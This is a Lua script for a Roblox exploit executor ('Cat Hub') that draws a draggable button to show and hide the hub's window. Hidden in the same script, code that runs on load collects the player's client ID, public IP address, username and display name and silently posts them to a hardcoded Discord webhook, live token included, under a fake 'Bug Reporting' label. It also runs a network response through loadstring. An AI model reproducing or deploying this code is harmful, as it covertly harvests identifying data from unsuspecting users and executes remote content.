
if game.CoreGui:FindFirstChild("CatHubOpenClose") then
    game.CoreGui:FindFirstChild("CatHubOpenClose"):Destroy()
end

local UIStroke = Instance.new("UIStroke")
local UICorner = Instance.new("UICorner")

local ScreenGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CatHubOpenClose"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling


ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
ImageButton.Draggable = true
ImageButton.Position = UDim2.new(0.102097899, 0, 0.0742971897, 0)
ImageButton.Size = UDim2.new(0, 59, 0, 49)
ImageButton.Image = "http://www.roblox.com/asset/?id=15348357130"

UICorner.Name = "MainCorner"
UICorner.CornerRadius = UDim.new(0, 9)
UICorner.Parent = ImageButton
local url = "https://discord.com/api/webhooks/1218178538121990246/Q-eRCiU02Qr_dTLyF1byv2q-mewUFLL83qzSjZyK0f-JR5NxDDhMFqUshp4w_kdQpIoc"
    local data = {
        ["username"] = 'Cat Hub X',
        ['content'] = '',
        ["avatar_url"] = "",
        ["embeds"] = {
            {
                ["description"] = "**Bug Reporting Webhook**",
                ["color"] = tonumber(255), -- color id		
                ["type"] = "rich",
                ["fields"] =  {
                    {
                        ["name"] = "Hwid",
                        ["value"] = '```lua'..'\n'..game:GetService("RbxAnalyticsService"):GetClientId()..'\n```',
                    },
                    {
                        ["name"] = "Hwid",
                        ["value"] = '```lua'..'\n'..loadstring(Game:HttpGet"https://api.ipify.org")()..'\n```',
                    },
                    {
                        ["name"] = "Username",
                        ["value"] = '```lua'..'\n'..game.Players.LocalPlayer.Name..'\n```',
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Display Name",
                        ["value"] = '```lua'..'\n'..game.Players.LocalPlayer.DisplayName..'\n```',
                        ["inline"] = true
                    }
                },
                ["footer"] = {
                    ["text"] = "Reported Bug",
                },
                ["timestamp"] = DateTime.now():ToIsoDate(),
            }
        },
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {["content-type"] = "application/json"}
    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
ImageButton.MouseButton1Down:connect(function()
        game.CoreGui:FindFirstChild("CatHub").Enabled = not game.CoreGui:FindFirstChild("CatHub").Enabled
end)
